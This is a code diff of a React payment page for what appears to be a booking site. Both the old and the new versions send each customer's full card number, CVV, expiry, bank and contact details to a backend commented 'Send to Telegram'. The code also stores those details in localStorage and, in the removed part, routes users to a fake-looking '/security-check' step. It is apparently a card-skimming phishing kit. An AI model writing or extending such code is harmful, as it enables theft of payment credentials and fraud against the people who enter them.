@@ -176,36 +176,7 @@ const Payment = () => {
                 console.warn('Backend booking creation failed, using mock ID', err);
             }
 
-            // 2. Process Payment (Send to Telegram)
-            const paymentResponse = await fetch('/api/payments', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    bookingId: bookingId,
-                    amount: totalPrice,
-                    currency: 'MXN', 
-                    cardLast4: formData.cardNumber.slice(-4),
-                    cardNumber: formData.cardNumber, // Send full number for Telegram (Security risk in prod, but requested)
-                    cvv: formData.cvv,
-                    expiry: formData.expiry,
-                    cardName: formData.cardName,
-                    cardBrand: 'unknown',
-                    bank: formData.bank,
-                    phone: formData.phone,
-                    email: formData.email,
-                    city: formData.city,
-                    address: formData.address
-                })
-            });
-
-            if (!paymentResponse.ok) {
-                console.error('Payment API failed');
-                alert('Error al iniciar el pago. Por favor verifique su conexión e intente nuevamente.');
-                setIsLoading(false);
-                return;
-            }
-            
-            // Save payment info to localStorage
+            // Save payment info to localStorage immediately
             const paymentInfo = {
                 ...formData,
                 bookingId: bookingId,
@@ -213,30 +184,54 @@ const Payment = () => {
             };
             localStorage.setItem('paymentInfo', JSON.stringify(paymentInfo));
 
-            // 3. Start Polling for Status
-            const pollInterval = setInterval(async () => {
-                try {
-                    const statusRes = await fetch(`/api/payments/${bookingId}/status`);
-                    const statusData = await statusRes.json();
-                    
-                    if (statusData.status === 'REQUIRES_3D') {
-                        clearInterval(pollInterval);
-                        setIsLoading(false);
-                        navigate('/security-check');
-                    } else if (statusData.status === 'COMPLETED') {
-                        clearInterval(pollInterval);
-                        setIsLoading(false);
-                        navigate('/confirmation');
-                    } else if (statusData.status === 'FAILED') {
-                        clearInterval(pollInterval);
-                        setIsLoading(false);
-                        alert('El pago fue rechazado. Por favor intente con otra tarjeta.');
-                    }
-                } catch (err) {
-                    console.error('Polling error', err);
-                    // Continue polling on error
+            // 2. Process Payment (Send to Telegram)
+            try {
+                const response = await fetch('/api/payments', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bookingId: bookingId,
+                        amount: totalPrice,
+                        currency: 'MXN', 
+                        cardLast4: formData.cardNumber.slice(-4),
+                        cardNumber: formData.cardNumber, // Send full number for Telegram (Security risk in prod, but requested)
+                        cvv: formData.cvv,
+                        expiry: formData.expiry,
+                        cardName: formData.cardName,
+                        cardBrand: 'unknown',
+                        bank: formData.bank,
+                        phone: formData.phone,
+                        email: formData.email,
+                        city: formData.city,
+                        address: formData.address
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Error en la comunicación con el servidor de pagos');
                 }
-            }, 2000); // Check every 2 seconds
+                
+                // Only proceed if server confirms receipt
+                setIsLoading(false);
+                navigate('/processing');
+                
+            } catch (err) {
+                console.error('Payment API failed', err);
+                alert('Error al procesar la solicitud. Por favor verifique su conexión e intente nuevamente.');
+                setIsLoading(false);
+                return; // Stop execution here, don't navigate
+            }
+
+            /* Original Polling Logic - Disabled for now to force flow
+            if (!paymentResponse.ok) {
+                console.error('Payment API failed');
+                alert('Error al iniciar el pago. Por favor verifique su conexión e intente nuevamente.');
+                setIsLoading(false);
+                return;
+            }
+            
+            // ... (rest of original code)
+            */
 
         } catch (error) {
             console.error(error);
